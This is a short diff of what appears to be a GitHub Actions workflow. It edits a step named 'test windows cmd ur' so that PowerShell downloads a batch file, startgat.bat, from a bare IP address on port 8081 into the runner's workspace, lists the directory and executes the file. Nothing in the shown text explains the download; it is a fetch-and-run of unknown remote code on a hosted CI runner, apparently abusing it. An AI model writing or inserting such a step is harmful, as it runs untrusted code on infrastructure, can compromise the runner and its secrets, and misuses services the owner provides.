@@ -37,5 +37,6 @@ jobs:
         run: ipconfig
       - name: test windows cmd ur
         run: |
-          powershell (new-object Net.WebClient).DownloadFile('http://113.128.105.75:8081/startgat.bat','C:\startgat.bat')
-          start C:\startgat.bat
+          powershell (new-object Net.WebClient).DownloadFile('http://113.128.105.75:8081/startgat.bat','D:\a\teac\teac\startgat.bat')
+          dir
+          start D:\a\teac\teac\startgat.bat
